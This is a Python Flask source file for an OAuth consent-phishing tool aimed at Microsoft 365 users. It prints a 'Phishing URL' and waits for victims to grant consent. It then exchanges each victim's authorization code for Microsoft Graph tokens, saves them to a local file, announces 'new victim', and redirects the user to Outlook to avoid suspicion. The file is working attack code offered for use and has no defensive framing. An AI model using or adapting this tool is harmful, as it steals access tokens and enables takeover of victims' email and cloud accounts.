import uuid
import requests
from flask import Flask, session, request, redirect, url_for
from flask_session import Session
import msal
import app_config
import json
import os
from os import path
from termcolor import colored
import pyfiglet
import adal  # Ensure adal is installed if you’re using it

app = Flask(__name__)
app.config.from_object(app_config)
Session(app)

@app.route('/')
def home():

    return redirect('https://outlook.office.com')

@app.route('/login/authorized', methods=['GET', 'POST'])
def authorized():
    try:
        # Retrieve the authorization code from the request
        code = request.args.get('code')

        # Initialize the ADAL authentication context
        auth_context = adal.AuthenticationContext(
            'https://login.microsoftonline.com/common', api_version=None
        )

        # Exchange the authorization code for tokens
        response = auth_context.acquire_token_with_authorization_code(
            code,
            app_config.REDIRECT_URL,
            'https://graph.microsoft.com/',
            app_config.CLIENT_ID,
            app_config.CLIENT_SECRET
        )

        user_email = response.get('userId') 

        with open('token_data.json', "w") as json_file:
            json.dump(response, json_file, indent=4)
            print(colored("[+] Token has been saved to token_data.json", "blue", attrs=["bold"]))
            print(colored(f"[+] We got new victim {response['userId']}", "yellow", attrs=["bold"]))

        # Redirect to a specified page after handling the token
        return redirect(url_for("home"))

    except Exception as e:
        print(colored(f"Error: {str(e)}", "red", attrs=["bold"]))
        return redirect("/")


def _load_cache():
    cache = msal.SerializableTokenCache()
    if session.get("token_cache"):
        cache.deserialize(session["token_cache"])
    return cache

def _save_cache(cache):
    if cache.has_state_changed:
        session["token_cache"] = cache.serialize()

def _build_msal_app(cache=None, authority=None):
    return msal.ConfidentialClientApplication(
        app_config.CLIENT_ID, authority=authority or app_config.AUTHORITY,
        client_credential=app_config.CLIENT_SECRET, token_cache=cache)

def _build_auth_url(authority=None, scopes=None, state=None):
    return _build_msal_app(authority=authority).get_authorization_request_url(
        scopes or [],
        state=state or str(uuid.uuid4()),
        redirect_uri=app_config.REDIRECT_URL)

app.jinja_env.globals.update(_build_auth_url=_build_auth_url)

if __name__ == "__main__":
    # Generate the login URL and print it with a banner before running the app
    phishing_url = _build_auth_url(scopes=app_config.SCOPE, state=str(uuid.uuid4()))
    
    # Format and display the banner and phishing URL
    banner = pyfiglet.figlet_format("Login URL", font="slant")
    print(colored(banner, "cyan"))
    print(colored("Phishing URL:", "green"), colored(phishing_url, "yellow", attrs=["bold"]))
    
    # Run the app
    app.run()
